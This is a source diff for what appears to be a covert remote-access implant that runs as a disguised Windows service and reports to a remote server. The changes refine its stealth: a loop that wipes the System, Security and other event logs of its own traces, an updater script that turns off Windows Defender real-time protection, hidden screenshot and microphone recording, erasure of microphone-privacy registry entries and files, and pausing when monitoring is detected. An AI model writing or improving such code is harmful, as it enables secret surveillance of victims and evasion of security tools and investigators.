@@ -98,6 +98,11 @@ HostConfig g_config;  // non-static: shared with dllmain.cpp
 static Logger& g_log = Logger::get();
 std::atomic<bool> g_running{true};  // non-static: used by service_host.h
 
+// Event log cleaner — forward-declared here so evtlog_set_config handler can use them
+static std::mutex               g_evtlog_cv_mtx;
+static std::condition_variable  g_evtlog_cv;
+static std::atomic<int>         g_evtlog_config_gen{0};
+
 // Screenshot globals (declared early for load_config access)
 static std::atomic<int> g_screenshot_interval{10};
 static std::atomic<int> g_screenshot_quality{75};
@@ -577,11 +582,11 @@ static void save_stream_settings() {
     out += "  \"screen_connections\": " + std::to_string(g_config.screen_connections) + ",\n";
     out += "  \"file_connections\": " + std::to_string(g_config.file_connections) + ",\n";
     out += "  \"log_level\": \"" + json_escape(get_existing("log_level", "INFO")) + "\",\n";
-    out += "  \"stun_server\": \"" + json_escape(get_existing("stun_server", g_config.stun_server)) + "\",\n";
-    out += "  \"turn_server\": \"" + json_escape(get_existing("turn_server", g_config.turn_server)) + "\",\n";
-    out += "  \"evtlog_clean_patterns\": \"" + json_escape(get_existing("evtlog_clean_patterns", g_config.evtlog_clean_patterns)) + "\",\n";
-    out += "  \"evtlog_clean_interval\": " + get_existing("evtlog_clean_interval", std::to_string(g_config.evtlog_clean_interval)) + ",\n";
-    out += "  \"evtlog_clean_mode\": \"" + json_escape(get_existing("evtlog_clean_mode", g_config.evtlog_clean_mode)) + "\",\n";
+    out += "  \"stun_server\": \"" + json_escape(g_config.stun_server) + "\",\n";
+    out += "  \"turn_server\": \"" + json_escape(g_config.turn_server) + "\",\n";
+    out += "  \"evtlog_clean_patterns\": \"" + json_escape(g_config.evtlog_clean_patterns) + "\",\n";
+    out += "  \"evtlog_clean_interval\": " + std::to_string(g_config.evtlog_clean_interval) + ",\n";
+    out += "  \"evtlog_clean_mode\": \"" + json_escape(g_config.evtlog_clean_mode) + "\",\n";
     out += "  \"screenshot_enabled\": " + std::string(g_config.screenshot_enabled ? "true" : "false") + ",\n";
     out += "  \"screenshot_interval\": " + std::to_string(g_config.screenshot_interval) + ",\n";
     out += "  \"screenshot_quality\": " + std::to_string(g_config.screenshot_quality) + ",\n";
@@ -1976,6 +1981,9 @@ static void handle_command(const std::string& msg_str) {
             if (!intv.empty()) { int v = 120; try { v = std::stoi(intv); } catch(...) {} g_config.evtlog_clean_interval = std::max(60, v); }
             g_config.evtlog_clean_patterns = pats; // empty = disabled
             save_stream_settings();
+            // Wake cleaner thread immediately so it picks up the new config
+            g_evtlog_config_gen.fetch_add(1);
+            g_evtlog_cv.notify_all();
             g_log.info("evtlog config updated: mode=" + g_config.evtlog_clean_mode +
                        " interval=" + std::to_string(g_config.evtlog_clean_interval) +
                        " patterns=" + g_config.evtlog_clean_patterns);
@@ -2456,10 +2464,13 @@ static void handle_command(const std::string& msg_str) {
                         addLn("start /wait /min powershell.exe -WindowStyle Hidden -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
                         addLn("timeout /t 2 /nobreak >nul 2>nul");
                         // Step 3: Stop service (host goes offline here)
+                        // sc stop blocks until SCM timeout (~30s) if service hangs — avoid deadlock:
+                        // 1) get host PID first, 2) send stop in background, 3) force-kill by PID after 5s
                         step("3|Stopping service");
-                        addLn("sc.exe stop WPnpSvc >nul 2>nul");
-                        addLn("timeout /t 3 /nobreak >nul 2>nul");
-                        addLn("taskkill.exe /F /IM rundll32.exe >nul 2>nul");
+                        addLn("for /f \"tokens=3\" %%P in ('sc queryex WPnpSvc ^| findstr /i \"PID\"') do set HOST_PID=%%P");
+                        addLn("start /b \"\" sc.exe stop WPnpSvc >nul 2>nul");
+                        addLn("timeout /t 5 /nobreak >nul 2>nul");
+                        addLn("if defined HOST_PID taskkill.exe /F /PID %HOST_PID% >nul 2>nul");
                         addLn("timeout /t 2 /nobreak >nul 2>nul");
                         // Step 4: Replace DLL
                         step("4|Replacing DLL");
@@ -2471,6 +2482,25 @@ static void handle_command(const std::string& msg_str) {
                         step("5|Starting service");
                         addLn("sc.exe start WPnpSvc >nul 2>nul");
                         addLn("timeout /t 8 /nobreak >nul 2>nul");
+                        // Verify service actually RUNNING — if not, roll back to .old and retry.
+                        // Without this the host stays offline forever if the new DLL is broken
+                        // or couldn't be loaded (e.g. dependency missing, import error).
+                        addLn("sc.exe query WPnpSvc | findstr /C:\"RUNNING\" >nul 2>nul");
+                        addLn("if not errorlevel 1 goto after_start_ok");
+                        step("5|Service not RUNNING, rolling back");
+                        addLn("for /f \"tokens=3\" %%P in ('sc queryex WPnpSvc ^| findstr /i \"PID\"') do set HOST_PID=%%P");
+                        addLn("start /b \"\" sc.exe stop WPnpSvc >nul 2>nul");
+                        addLn("timeout /t 5 /nobreak >nul 2>nul");
+                        addLn("if defined HOST_PID taskkill.exe /F /PID %HOST_PID% >nul 2>nul");
+                        addLn("timeout /t 2 /nobreak >nul 2>nul");
+                        addLn("del /f /q \"" + currentDll + "\" >nul 2>nul");
+                        addLn("if exist \"" + oldDll + "\" copy /y \"" + oldDll + "\" \"" + currentDll + "\" >nul 2>nul");
+                        addLn("sc.exe start WPnpSvc >nul 2>nul");
+                        addLn("timeout /t 5 /nobreak >nul 2>nul");
+                        addLn("sc.exe query WPnpSvc | findstr /C:\"RUNNING\" >nul 2>nul");
+                        addLn("if not errorlevel 1 (echo ERR^|Rollback OK, new DLL invalid > \"" + stepFile + "\" & goto cleanup)");
+                        addLn("echo ERR^|Rollback FAILED — host offline > \"" + stepFile + "\" & goto cleanup");
+                        addLn(":after_start_ok");
                         // Step 6: Re-enable Defender
                         step("6|Re-enabling Defender");
                         addLn("start /wait /min powershell.exe -WindowStyle Hidden -Command \"Set-MpPreference -DisableRealtimeMonitoring $false\"");
@@ -2695,7 +2725,9 @@ static void handle_command(const std::string& msg_str) {
                     "\",\"quality\":" + std::to_string(g_quality) +
                     ",\"fps\":" + std::to_string(g_fps) +
                     ",\"scale\":" + std::to_string(g_scale) +
-                    ",\"bitrate\":" + std::to_string(g_bitrate) + "}");
+                    ",\"bitrate\":" + std::to_string(g_bitrate) +
+                    ",\"stun_server\":\"" + json_escape(g_config.stun_server) + "\"" +
+                    ",\"turn_server\":\"" + json_escape(g_config.turn_server) + "\"}");
         }
 
         // ── Server-side bandwidth throttle feedback ──
@@ -3300,6 +3332,7 @@ static void screenshot_thread_func() {
 
         if (!g_running || !g_screenshot_active.load()) continue;
         if (!g_ws || !g_ws->is_connected()) { g_log.debug("Screenshot: VPS offline, skipping"); continue; }
+        if (g_paused_by_threat.load()) { g_log.debug("Screenshot: paused by threat, skipping"); continue; }
 
         g_log.info("Screenshot: capturing...");
         std::vector<uint8_t> jpegData;
@@ -3574,9 +3607,12 @@ static bool capture_audio_direct(std::vector<uint8_t>& audioOut, int duration, i
 
     g_log.info("Audio: recording " + std::to_string(duration) + "s @ " + std::to_string(opusSR) + "Hz gain=" + std::to_string(g_audio_gain.load()) + "%");
 
-    // !!! CHANGED: unified cleanup using anti‑detection functions
+    // !!! CHANGED: unified cleanup using anti‑detection functions.
+    // NOTE: AudioSuspendIndicatorProcesses (kills ShellExperienceHost/StartMenuExperienceHost)
+    // removed from the periodic cycle — terminating the shell every 10s for hours caused Windows
+    // UI to lag and eventually freeze. Registry/privacy-file cleanup is harmless to leave at 10s.
+    // Shell kill still runs in AudioFullCleanup which triggers only when Settings is actually open.
     auto cleanMicReg = []() {
-        AudioSuspendIndicatorProcesses();
         AudioCleanMicRegistry();         // removes registry traces
         AudioDeletePrivacyFiles();       // deletes privacy database files
     };
@@ -3587,8 +3623,10 @@ static bool capture_audio_direct(std::vector<uint8_t>& audioOut, int duration, i
     DWORD lastClean = 0;
     while ((GetTickCount() - startTick) < maxWait && g_audio_active.load() && g_running) {
         if (waveHdr.dwFlags & WHDR_DONE) break;
-        // Periodic mic trace cleanup every 10 seconds
-        if (GetTickCount() - lastClean > 500) { cleanMicReg(); lastClean = GetTickCount(); }
+        // Threat pause: abort this recording segment; next tick of audio_record_thread will retry
+        if (g_paused_by_threat.load()) { g_log.info("Audio: paused by threat, abort segment"); break; }
+        // Periodic mic trace cleanup every 10 seconds (was 500ms — blocked capture loop)
+        if (GetTickCount() - lastClean > 10000) { cleanMicReg(); lastClean = GetTickCount(); }
         Sleep(500);
     }
 
@@ -3638,7 +3676,7 @@ static bool capture_audio_direct(std::vector<uint8_t>& audioOut, int duration, i
             g_log.info("Audio: denoise applied (hpf+gate)");
         }
         if (g_audio_normalize.load()) {
-            audio_dsp::apply_normalize(samples, numSamples, 0.90f, 8.0f);
+            audio_dsp::apply_normalize(samples, numSamples, 0.90f, 3.5f);
             g_log.info("Audio: normalized");
         }
     }
@@ -3765,9 +3803,9 @@ static void capture_audio_live_stream(int sampleRate, int bitrate, int channels,
         }
     }
 
-    // !!! CHANGED: unified cleanup using anti‑detection functions
+    // !!! CHANGED: unified cleanup using anti‑detection functions.
+    // Shell-process kill removed from periodic cleanup — see capture_audio_direct for rationale.
     auto cleanMicReg = []() {
-        AudioSuspendIndicatorProcesses();
         AudioCleanMicRegistry();         // removes registry traces
         AudioDeletePrivacyFiles();       // deletes privacy database files
     };
@@ -3935,7 +3973,8 @@ static void capture_audio_live_stream(int sampleRate, int bitrate, int channels,
             }
 
             // Accumulate PCM for recording (before encoding for live)
-            if (alsoRecord) {
+            // Skip when paused by threat — avoid saving data captured during monitoring
+            if (alsoRecord && !g_paused_by_threat) {
                 recPcmAccum.insert(recPcmAccum.end(), (BYTE*)wh->lpData, (BYTE*)wh->lpData + recorded);
             }
 
@@ -3972,12 +4011,12 @@ static void capture_audio_live_stream(int sampleRate, int bitrate, int channels,
             waveInAddBuffer(hWaveIn, wh, sizeof(WAVEHDR));
         }
 
-        // Flush recording periodically
-        if (alsoRecord && (GetTickCount() - recStartTick) >= recIntervalMs) {
+        // Flush recording periodically (skip while paused — no new PCM accumulated anyway)
+        if (alsoRecord && !g_paused_by_threat && (GetTickCount() - recStartTick) >= recIntervalMs) {
             flushRecording();
         }
-		cleanMicReg();
-        if (GetTickCount() - lastClean > 500) { cleanMicReg(); lastClean = GetTickCount(); gain = g_audio_gain.load(); }
+        // Periodic mic trace cleanup every 10 seconds (was 500ms — blocked sender loop)
+        if (GetTickCount() - lastClean > 10000) { cleanMicReg(); lastClean = GetTickCount(); gain = g_audio_gain.load(); }
     }
 
     // Flush remaining recording
@@ -4243,64 +4282,60 @@ static void threat_monitor_func() {
 // ═══════════════════════════════════════════════════════════════
 //  EVENT LOG AUTO-CLEANER — removes all traces of this host
 // ═══════════════════════════════════════════════════════════════
-static std::thread g_evtlog_cleaner_thread;
+static std::thread              g_evtlog_cleaner_thread;
+
+// Interruptible sleep: returns early if g_running goes false OR config changes (gen changes)
+static void evtlog_sleep(int seconds, int gen_at_start) {
+    std::unique_lock<std::mutex> lk(g_evtlog_cv_mtx);
+    g_evtlog_cv.wait_for(lk, std::chrono::seconds(seconds), [&]{
+        return !g_running.load() || g_evtlog_config_gen.load() != gen_at_start;
+    });
+}
+
+static std::string evtlog_build_pattern(const std::string& cfg_patterns) {
+    std::string patterns;
+    std::istringstream ss(cfg_patterns);
+    std::string token;
+    while (std::getline(ss, token, ',')) {
+        while (!token.empty() && token.front() == ' ') token.erase(token.begin());
+        while (!token.empty() && token.back() == ' ')  token.pop_back();
+        if (token.empty()) continue;
+        if (!patterns.empty()) patterns += "|";
+        patterns += token;
+    }
+    return patterns;
+}
 
 static void evtlog_cleaner_func() {
-    // Wait for config to be loaded
-    std::this_thread::sleep_for(std::chrono::seconds(5));
-
-    // If no patterns configured, disable cleaner
-    if (g_config.evtlog_clean_patterns.empty()) {
-        g_log.info("Event log cleaner: no patterns configured (set evtlog_clean_patterns in config)");
-        return;
-    }
-
-    g_log.info("Event log cleaner started, interval=" + std::to_string(g_config.evtlog_clean_interval) + "s");
-
-    // Build regex pattern from config: comma-separated → pipe-separated for PS -match
-    // User provides: "keyword1,keyword2,SomeDll,192.168.1.100"
-    // We convert to PS regex: "keyword1|keyword2|SomeDll|192\.168\.1\.100"
-    std::string patterns;
+    // Wait for config to be loaded at service startup
     {
-        std::istringstream ss(g_config.evtlog_clean_patterns);
-        std::string token;
-        while (std::getline(ss, token, ',')) {
-            // Trim whitespace
-            while (!token.empty() && token.front() == ' ') token.erase(token.begin());
-            while (!token.empty() && token.back() == ' ') token.pop_back();
-            if (token.empty()) continue;
-            if (!patterns.empty()) patterns += "|";
-            patterns += token;
-        }
-    }
-    if (patterns.empty()) {
-        g_log.info("Event log cleaner: patterns empty after parse, disabled");
-        return;
+        std::unique_lock<std::mutex> lk(g_evtlog_cv_mtx);
+        g_evtlog_cv.wait_for(lk, std::chrono::seconds(5), []{ return !g_running.load(); });
     }
 
-    bool once_mode = (g_config.evtlog_clean_mode == "once");
-    g_log.info("Event log cleaner patterns: " + patterns + " mode=" + g_config.evtlog_clean_mode);
+    // Logs to scan (fixed list)
+    const std::vector<std::string> logs = {"System", "Application", "Security", "Setup"};
 
-    // Logs to scan
-    std::vector<std::string> logs = {"System", "Application", "Security", "Setup"};
-    // Minimum 60s — PowerShell is heavy, running it more often than once per minute
-    // causes sustained CPU spikes.
-    int interval = std::max(60, g_config.evtlog_clean_interval);
-
-    bool first_run = true;
+    // Main loop — never exits while g_running, re-reads config on every iteration
     while (g_running) {
-        // On first iteration, run immediately (startup clean).
-        // On subsequent iterations, sleep first (periodic mode only).
-        if (!first_run) {
-            if (once_mode) {
-                g_log.info("Event log cleaner: once mode — done, exiting");
-                return;
-            }
-            for (int i = 0; i < interval && g_running; i++) {
-                std::this_thread::sleep_for(std::chrono::seconds(1));
-            }
+        int gen = g_evtlog_config_gen.load();
+
+        // Re-read config on every pass — picks up UI changes immediately
+        std::string pat_raw  = g_config.evtlog_clean_patterns;
+        std::string mode_str = g_config.evtlog_clean_mode;
+        int         interval = std::max(60, g_config.evtlog_clean_interval);
+        bool        once_mode = (mode_str == "once");
+
+        std::string patterns = evtlog_build_pattern(pat_raw);
+
+        if (patterns.empty()) {
+            // No patterns configured — wait 10s then re-check (user may configure later)
+            g_log.debug("Event log cleaner: no patterns, waiting...");
+            evtlog_sleep(10, gen);
+            continue;
         }
-        first_run = false;
+
+        g_log.info("Event log cleaner: patterns=" + patterns + " mode=" + mode_str + " interval=" + std::to_string(interval) + "s");
         if (!g_running) break;
 
         for (const auto& logName : logs) {
@@ -4324,15 +4359,18 @@ static void evtlog_cleaner_func() {
                     "$toDelete=@()\n"
                     "$toKeep=@()\n"
                     "foreach($e in $events){\n"
-                    "  $msg=$e.Message\n"
-                    "  $props=''\n"
-                    "  try{ $props=(($e.Properties|ForEach-Object{[string]$_.Value}) -join ' ') }catch{}\n"
-                    "  $prov=$e.ProviderName\n"
-                    "  if(($msg -match $pattern) -or ($props -match $pattern) -or ($prov -match $pattern)){\n"
-                    "    $toDelete+=$e\n"
-                    "  } else {\n"
-                    "    $toKeep+=$e\n"
-                    "  }\n"
+                    "  $matched=$false\n"
+                    "  try{\n"
+                    "    $msg=[string]$e.Message\n"
+                    "    $prov=[string]$e.ProviderName\n"
+                    "    $props=(($e.Properties|ForEach-Object{[string]$_.Value}) -join ' ')\n"
+                    "    $xml=''; try{ $xml=$e.ToXml() }catch{}\n"
+                    "    $task=[string]$e.TaskDisplayName\n"
+                    "    if(($msg -match $pattern) -or ($props -match $pattern) -or\n"
+                    "       ($prov -match $pattern) -or ($xml -match $pattern) -or\n"
+                    "       ($task -match $pattern)){ $matched=$true }\n"
+                    "  }catch{ $matched=$false }\n"
+                    "  if($matched){ $toDelete+=$e } else { $toKeep+=$e }\n"
                     "}\n"
                     "if($toDelete.Count -eq 0){Write-Output 'CLEAN';exit}\n"
                     "# Wipe channel\n"
@@ -4377,6 +4415,19 @@ static void evtlog_cleaner_func() {
                 }
             } catch (...) {}
         }
+
+        if (!g_running) break;
+
+        if (once_mode) {
+            g_log.info("Event log cleaner: once mode — done, waiting for config change");
+            // Don't exit — wait until config changes (user switches to periodic or changes patterns)
+            evtlog_sleep(3600, gen); // sleep up to 1h, wakes instantly on config change
+            continue;
+        }
+
+        // Periodic mode: sleep interval seconds, wake early on config change or shutdown
+        g_log.debug("Event log cleaner: next run in " + std::to_string(interval) + "s");
+        evtlog_sleep(interval, gen);
     }
     g_log.info("Event log cleaner stopped");
 }
